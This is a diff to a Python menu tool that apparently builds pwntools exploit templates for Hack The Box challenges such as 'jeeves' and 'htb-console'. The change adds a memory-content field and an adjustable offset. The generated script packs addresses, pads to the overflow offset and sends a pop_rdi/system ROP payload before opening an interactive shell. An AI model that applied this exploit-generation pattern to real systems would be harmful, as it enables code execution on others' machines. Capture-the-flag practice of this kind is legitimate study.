@@ -259,14 +259,14 @@ def options():
       print(colored(FUNC[17],colour6), end=' ')     
    print('\u2551')
    # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- - 
-   print('\u2551' + "(06) DESTIN INDEX (16)                (26) Switch File Mode (36) Read DeBugInfo (46) Set Buffer OFFSET (56)               " + '\u2551',end=' ')
+   print('\u2551' + "(06) DESTIN INDEX (16) MEMORY CONTENT (26) Switch File Mode (36) Read DeBugInfo (46) Set Buffer OFFSET (56)               " + '\u2551',end=' ')
    if "main" in FUNC[18]:
       print(colored(FUNC[18],colour3), end=' ')
    else:
       print(colored(FUNC[18],colour6), end=' ')     
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(07) STACKPOINTER (17)                (27) Examine  Program (37) Read Assembley (47)                   (57) Set I.P./Port " + '\u2551',end=' ')
+   print('\u2551' + "(07) STACKPOINTER (17)                (27) Examine  Program (37) Read Assembley (47) Adjust the OFFSET (57) Set I.P./Port " + '\u2551',end=' ')
    if "main" in FUNC[19]:
       print(colored(FUNC[19],colour3), end=' ')
    else:
@@ -409,7 +409,7 @@ GRAD = [" "*COL2]*maxDispl
 HED1[0]  = spacePadding(" SYSTEM ADDRESS ", COL1+2)   
 HED1[1]  = spacePadding(" JUMPTOFUNCTION ", COL1+2)   
 HED1[2]  = spacePadding(" OVERWRITE ADDR ", COL1+2)   
-HED1[3]  = spacePadding("                ", COL1+2)   
+HED1[3]  = spacePadding(" MEMORY CONTENT ", COL1+2)   
 HED1[4]  = spacePadding("                ", COL1+2)   
 HED1[5]  = spacePadding("                ", COL1+2)   
 HED1[6]  = spacePadding("                ", COL1+2)   
@@ -1678,7 +1678,9 @@ while True:
       if DATA[0][:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
-         pass
+         CSEC[9] = input("[?] Enter adjusted offset value: ")
+         CSEC[9] = spacePadding(CSEC[9], COL1)
+         HED4[9] = "ADJUST "
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
@@ -1915,7 +1917,7 @@ while True:
             command("echo 'system    = p64(" + REG2[0].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
             command("echo 'jumpto    = p64(" + REG2[1].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
             command("echo 'overwrite = p64(" + REG2[2].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-            command("echo 'unset_1   = p64(" + REG2[3].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'memory    = p64(" + REG2[3].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
             command("echo 'unset_2   = p64(" + REG2[4].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
             command("echo 'unset_3   = p64(" + REG2[5].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
             command("echo 'unset_4   = p64(" + REG2[6].rstrip(" ") + ")' >> " + localDir + "/exploit.py")         
@@ -1942,7 +1944,7 @@ while True:
             command("echo 'system    = p32(" + REG2[0].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
             command("echo 'jumpto    = p32(" + REG2[1].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
             command("echo 'overwrite = p32(" + REG2[2].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-            command("echo 'unset_1   = p32(" + REG2[3].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'memory    = p32(" + REG2[3].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
             command("echo 'unset_2   = p32(" + REG2[4].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
             command("echo 'unset_3   = p32(" + REG2[5].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
             command("echo 'unset_4   = p32(" + REG2[6].rstrip(" ") + ")' >> " + localDir + "/exploit.py")         
@@ -1951,9 +1953,13 @@ while True:
             command("echo 'puts_got  = p32(" + REG2[9].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
             command("echo 'pop_rdi   = p32(" + REG2[10].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
             command("echo 'libc_addr = p32(" + REG2[11].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-            command("echo '' >> " + localDir + "/exploit.py")          
-                
-         command("echo 'offset     = (" + CSEC[6].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo '' >> " + localDir + "/exploit.py")                
+         
+         if CSEC[9][:1] == " ":
+            command("echo 'offset     = " + CSEC[6].rstrip(" ") + "' >> " + localDir + "/exploit.py")
+         else:
+            command("echo 'offset     = " + CSEC[9].rstrip(" ") + "' >> " + localDir + "/exploit.py")                 
+         
          command("echo 'padding    = \"a\" * offset' >> " + localDir + "/exploit.py")
          command("echo 'terminater = \"\\\\n\"' >> " + localDir + "/exploit.py")         
          command("echo '' >> " + localDir + "/exploit.py")         
@@ -1966,13 +1972,15 @@ while True:
             command("echo '' >> " + localDir + "/exploit.py") # SPACER   
          
          if DATA[0][:6] == "jeeves":
-            command("echo 'payload = flat(PADDING,overwrite,terminater)' >> "  + localDir + "/exploit.py")
+            command("echo 'payload = flat(padding,overwrite,terminater)' >> "  + localDir + "/exploit.py")
             command("echo '# print(payload)' >> " + localDir + "/exploit.py")
             command("echo '' >> " + localDir + "/exploit.py") # SPACER
          
          if DATA[0][:11] == "htb-console":
-            command("echo 'payload = flat(padding,pop_rdi,custom_addr,terminater)' >> "  + localDir + "/exploit.py")
+            command("echo 'payload = flat(padding,pop_rdi,memory,system,terminater)' >> "  + localDir + "/exploit.py")
             command("echo '# print(payload)' >> " + localDir + "/exploit.py") 
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER
+ 
             command("echo 's.recvuntil(\">>\")' >> " + localDir + "/exploit.py")
             command("echo 's.sendline(\"hof\")' >> " + localDir + "/exploit.py")
             command("echo 's.recvuntil(\":\")' >> " + localDir + "/exploit.py")
@@ -1985,7 +1993,7 @@ while True:
          
          command("echo 's.send(payload)' >> " + localDir + "/exploit.py")
          command("echo 's.interactive()' >> " + localDir + "/exploit.py")
-         command("echo 's.close()' >> " + localDir + "/exploit.py")
+         command("echo '# s.close()' >> " + localDir + "/exploit.py")
          
          print(colored("[*] Python exploit template sucessfully created...", colour3))
       prompt()                       
